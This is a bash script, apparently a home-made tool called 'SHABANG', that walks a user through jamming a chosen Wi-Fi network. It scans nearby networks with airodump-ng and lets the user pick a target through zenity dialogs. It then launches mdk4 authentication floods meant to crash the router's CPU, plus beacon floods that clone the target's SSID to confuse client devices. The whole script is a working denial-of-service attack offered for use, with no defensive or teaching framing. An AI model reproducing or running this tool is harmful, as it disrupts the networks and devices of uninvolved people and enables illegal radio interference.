#!/bin/bash

# --- 1. GUI Interface Selection ---
# Select your two RTL88x2bu cards
INT_JAM=$(zenity --list --title="SHABANG: Select Jammer Card" --column="Interfaces" $(ls /sys/class/net | grep wlan))
INT_MON=$(zenity --list --title="SHABANG: Select Monitoring Card" --column="Interfaces" $(ls /sys/class/net | grep wlan))

if [ -z "$INT_JAM" ] || [ -z "$INT_MON" ]; then
    zenity --error --text="Interfaces not selected. Exiting."
    exit 1
fi

# --- 2. GUI Scanner ---
# Scans 2.4GHz (Band g)
zenity --info --text="Scanning 2.4GHz for 30 seconds. Look for your target in the terminal." --width=300
xterm -geometry 100x24 -e "airodump-ng $INT_MON --band g -w /tmp/scan --output-format csv" &
SCAN_PID=$!
sleep 30
kill $SCAN_PID

# --- 3. Target Selection GUI ---
TARGET_RAW=$(awk -F, 'NR>2 {print $1 "|" $14}' /tmp/scan-01.csv | zenity --list --title="Select Target Network" --column="BSSID" --column="SSID" --delimiter="|")
BSSID=$(echo $TARGET_RAW | cut -d'|' -f1 | tr -d ' ')
ESSID=$(echo $TARGET_RAW | cut -d'|' -f2 | tr -d ' ')
CH=$(grep "$BSSID" /tmp/scan-01.csv | awk -F, '{print $4}' | tr -d ' ')

if [ -z "$BSSID" ]; then exit; fi

# --- 4. The Attack (The Shabang) ---
zenity --question --text="Target: $ESSID ($BSSID) on CH $CH\n\nLaunch Unadulterated Hate Mode?" --ok-label="START SHABANG"

if [ $? -eq 0 ]; then
    # Lock frequencies
    iw dev $INT_JAM set channel $CH
    iw dev $INT_MON set channel $CH

    # [Window 1] WPA3 SAE Flood: The CPU Crusher
    # Forces the router to calculate complex ECC math until it hangs.
    xterm -T "WPA3 SAE CRASH" -e "mdk4 $INT_JAM a -a $BSSID -m -s 1000" &

    # [Window 2] Beacon Flooding: The SSID Confusion
    # Creates 50 fake clones of the SSID to lag client devices.
    xterm -T "SSID CONFUSION" -e "mdk4 $INT_MON b -n '$ESSID' -c $CH -s 100" &

    # [Window 3] Live Monitor
    xterm -T "FALLOUT MONITOR" -e "airodump-ng --bssid $BSSID --channel $CH $INT_MON" &

    zenity --info --text="SHABANG ACTIVE.\n\nCard 1: Crashing Router CPU\nCard 2: Flooding Fake SSIDs\n\nClose terminals to stop."
fi

# Cleanup
rm /tmp/scan-01.csv*
